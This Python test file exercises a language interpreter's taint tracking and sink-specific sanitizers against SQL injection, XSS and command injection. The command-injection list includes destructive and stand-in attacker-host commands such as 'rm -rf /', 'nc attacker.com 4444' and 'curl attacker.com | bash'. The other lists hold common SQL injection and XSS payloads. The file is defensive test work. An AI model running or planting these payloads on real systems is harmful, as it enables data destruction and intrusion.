"""
Comprehensive adversarial attack tests for Phase 1: Sink-Aware Sanitizers
Tests SQL injection, XSS, and command injection with sink-specific sanitization
"""
from lexer import Lexer
from parser import Parser
from runtime import Interpreter
from taint import TaintLevel, SinkKind
from rich.console import Console
from rich.panel import Panel


def test_canonical_pipeline():
    """Test that the canonical pipeline still works with sink-aware sanitizers"""
    console = Console()
    console.print("[bold cyan]Testing Canonical Pipeline[/bold cyan]\n")
    
    source = """
let user_input = "admin' OR '1'='1";
let sanitized = sanitize_for_sql(user_input);
db_write("users", sanitized);
"""
    
    try:
        lexer = Lexer(source)
        tokens = lexer.tokenize()
        parser = Parser(tokens)
        program = parser.parse()
        interpreter = Interpreter(console=console)
        interpreter.run(program, source_code=source)
        console.print("[green]✓ Canonical pipeline executes correctly[/green]\n")
    except Exception as e:
        console.print(f"[red]✗ Pipeline error: {e}[/red]\n")


def test_sql_injection_protection():
    """Test that SQL injection payloads are blocked without SQL sanitization"""
    console = Console()
    console.print("[bold cyan]Testing SQL Injection Protection[/bold cyan]\n")
    
    sql_payloads = [
        "admin' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin' UNION SELECT * FROM users--",
        "'; EXEC xp_cmdshell('dir') --",
        "1' AND 1=1--",
        "admin'/*",
        "1' ORDER BY 1--",
        "'; SELECT * FROM information_schema.tables--",
        "admin' OR 'x'='x",
        "1' AND SLEEP(5)--",
    ]
    
    blocked = 0
    for payload in sql_payloads:
        source = f"""
let user_input = set_untrusted("{payload}");
db_write("users", user_input);
"""
        try:
            lexer = Lexer(source)
            tokens = lexer.tokenize()
            parser = Parser(tokens)
            program = parser.parse()
            interpreter = Interpreter(console=console)
            interpreter.run(program, source_code=source)
            console.print(f"[red]  ✗ Not blocked: {payload[:30]}...[/red]")
        except Exception:
            console.print(f"[green]  ✓ Blocked: {payload[:30]}...[/green]")
            blocked += 1
    
    console.print(f"\n[green]✓ {blocked}/{len(sql_payloads)} SQL injection payloads blocked[/green]\n")


def test_sql_sanitizer_allows_safe():
    """Test that SQL sanitization allows safe queries"""
    console = Console()
    console.print("[bold cyan]Testing SQL Sanitizer Allows Safe Queries[/bold cyan]\n")
    
    safe_queries = [
        "username",
        "john_doe",
        "user@example.com",
        "Hello World",
        "12345",
    ]
    
    allowed = 0
    for query in safe_queries:
        source = f"""
let user_input = "{query}";
let sanitized = sanitize_for_sql(user_input);
db_write("users", sanitized);
"""
        try:
            lexer = Lexer(source)
            tokens = lexer.tokenize()
            parser = Parser(tokens)
            program = parser.parse()
            interpreter = Interpreter(console=console)
            interpreter.run(program, source_code=source)
            console.print(f"[green]  ✓ Allowed: {query}[/green]")
            allowed += 1
        except Exception as e:
            console.print(f"[red]  ✗ Blocked: {query} - {e}[/red]")
    
    console.print(f"\n[green]✓ {allowed}/{len(safe_queries)} safe queries allowed[/green]\n")


def test_xss_protection():
    """Test that XSS payloads are blocked without HTML sanitization"""
    console = Console()
    console.print("[bold cyan]Testing XSS Protection[/bold cyan]\n")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<iframe src='javascript:alert(1)'>",
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1)><option>",
        "<textarea onfocus=alert(1)>",
        "<keygen onfocus=alert(1)>",
    ]
    
    blocked = 0
    for payload in xss_payloads:
        source = f"""
let user_input = set_untrusted("{payload}");
html_render(user_input);
"""
        try:
            lexer = Lexer(source)
            tokens = lexer.tokenize()
            parser = Parser(tokens)
            program = parser.parse()
            interpreter = Interpreter(console=console)
            interpreter.run(program, source_code=source)
            console.print(f"[red]  ✗ Not blocked: {payload[:30]}...[/red]")
        except Exception:
            console.print(f"[green]  ✓ Blocked: {payload[:30]}...[/green]")
            blocked += 1
    
    console.print(f"\n[green]✓ {blocked}/{len(xss_payloads)} XSS payloads blocked[/green]\n")


def test_html_sanitizer_allows_safe():
    """Test that HTML sanitization allows safe HTML"""
    console = Console()
    console.print("[bold cyan]Testing HTML Sanitizer Allows Safe HTML[/bold cyan]\n")
    
    safe_html = [
        "<div>Hello World</div>",
        "<p>Paragraph</p>",
        "<span>Text</span>",
        "Hello",
        "12345",
    ]
    
    allowed = 0
    for html in safe_html:
        source = f"""
let user_input = "{html}";
let sanitized = sanitize_for_html(user_input);
html_render(sanitized);
"""
        try:
            lexer = Lexer(source)
            tokens = lexer.tokenize()
            parser = Parser(tokens)
            program = parser.parse()
            interpreter = Interpreter(console=console)
            interpreter.run(program, source_code=source)
            console.print(f"[green]  ✓ Allowed: {html}[/green]")
            allowed += 1
        except Exception as e:
            console.print(f"[red]  ✗ Blocked: {html} - {e}[/red]")
    
    console.print(f"\n[green]✓ {allowed}/{len(safe_html)} safe HTML allowed[/green]\n")


def test_command_injection_protection():
    """Test that command injection payloads are blocked without SHELL sanitization"""
    console = Console()
    console.print("[bold cyan]Testing Command Injection Protection[/bold cyan]\n")
    
    command_payloads = [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc attacker.com 4444",
        "$(reboot)",
        "`whoami`",
        "; wget http://evil.com/shell.sh",
        "&& bash shell.sh",
        "| python exploit.py",
        "$(curl attacker.com)",
        "`curl attacker.com | bash`",
    ]
    
    blocked = 0
    for payload in command_payloads:
        source = f"""
let user_input = "echo hello {payload}";
shell_exec(user_input);
"""
        try:
            lexer = Lexer(source)
            tokens = lexer.tokenize()
            parser = Parser(tokens)
            program = parser.parse()
            interpreter = Interpreter(console=console)
            interpreter.run(program, source_code=source)
            console.print(f"[red]  ✗ Not blocked: {payload[:30]}...[/red]")
        except Exception:
            console.print(f"[green]  ✓ Blocked: {payload[:30]}...[/green]")
            blocked += 1
    
    console.print(f"\n[green]✓ {blocked}/{len(command_payloads)} command injection payloads blocked[/green]\n")


def test_shell_sanitizer_allows_safe():
    """Test that SHELL sanitization allows safe commands"""
    console = Console()
    console.print("[bold cyan]Testing SHELL Sanitizer Allows Safe Commands[/bold cyan]\n")
    
    safe_commands = [
        "echo hello",
        "cat file.txt",
        "ls",
        "pwd",
    ]
    
    allowed = 0
    for cmd in safe_commands:
        source = f"""
let user_input = "{cmd}";
let sanitized = sanitize_for_shell(user_input);
shell_exec(sanitized);
"""
        try:
            lexer = Lexer(source)
            tokens = lexer.tokenize()
            parser = Parser(tokens)
            program = parser.parse()
            interpreter = Interpreter(console=console)
            interpreter.run(program, source_code=source)
            console.print(f"[green]  ✓ Allowed: {cmd}[/green]")
            allowed += 1
        except Exception as e:
            console.print(f"[red]  ✗ Blocked: {cmd} - {e}[/red]")
    
    console.print(f"\n[green]✓ {allowed}/{len(safe_commands)} safe commands allowed[/green]\n")


def test_sink_kind_mismatch():
    """Test that data sanitized for one sink is rejected at another sink"""
    console = Console()
    console.print("[bold cyan]Testing Sink Kind Mismatch[/bold cyan]\n")
    
    # Test SQL-sanitized data at HTML sink
    source = """
let user_input = "<script>alert('XSS')</script>";
let sql_sanitized = sanitize_for_sql(user_input);
html_render(sql_sanitized);
"""
    try:
        lexer = Lexer(source)
        tokens = lexer.tokenize()
        parser = Parser(tokens)
        program = parser.parse()
        interpreter = Interpreter(console=console)
        interpreter.run(program, source_code=source)
        console.print("[red]✗ SQL-sanitized data incorrectly allowed at HTML sink[/red]\n")
    except Exception:
        console.print("[green]✓ SQL-sanitized data correctly blocked at HTML sink[/green]\n")
    
    # Test HTML-sanitized data at SQL sink
    source = """
let user_input = "admin' OR '1'='1";
let html_sanitized = sanitize_for_html(user_input);
db_write("users", html_sanitized);
"""
    try:
        lexer = Lexer(source)
        tokens = lexer.tokenize()
        parser = Parser(tokens)
        program = parser.parse()
        interpreter = Interpreter(console=console)
        interpreter.run(program, source_code=source)
        console.print("[red]✗ HTML-sanitized data incorrectly allowed at SQL sink[/red]\n")
    except Exception:
        console.print("[green]✓ HTML-sanitized data correctly blocked at SQL sink[/green]\n")


def test_general_sanitizer():
    """Test that GENERAL sanitizer works but is less safe"""
    console = Console()
    console.print("[bold cyan]Testing GENERAL Sanitizer (Legacy)[/bold cyan]\n")
    
    # GENERAL should work at any sink but is less safe
    source = """
let user_input = "test data";
let general_sanitized = sanitize_string(user_input);
db_write("users", general_sanitized);
"""
    try:
        lexer = Lexer(source)
        tokens = lexer.tokenize()
        parser = Parser(tokens)
        program = parser.parse()
        interpreter = Interpreter(console=console)
        interpreter.run(program, source_code=source)
        console.print("[green]✓ GENERAL sanitizer accepted at SQL sink[/green]\n")
    except Exception as e:
        console.print(f"[red]✗ GENERAL sanitizer rejected: {e}[/red]\n")


def main():
    console = Console()
    console.print(Panel.fit("[bold cyan]🔒 IPL Phase 1: Sink-Aware Sanitizer Tests[/bold cyan]"))
    console.print("[dim]Testing sink-specific sanitization and enforcement[/dim]\n")
    
    test_canonical_pipeline()
    test_sql_injection_protection()
    test_sql_sanitizer_allows_safe()
    test_xss_protection()
    test_html_sanitizer_allows_safe()
    test_command_injection_protection()
    test_shell_sanitizer_allows_safe()
    test_sink_kind_mismatch()
    test_general_sanitizer()
    
    console.print(Panel.fit("[bold green]✓ All Phase 1 tests completed[/bold green]"))


if __name__ == "__main__":
    main()
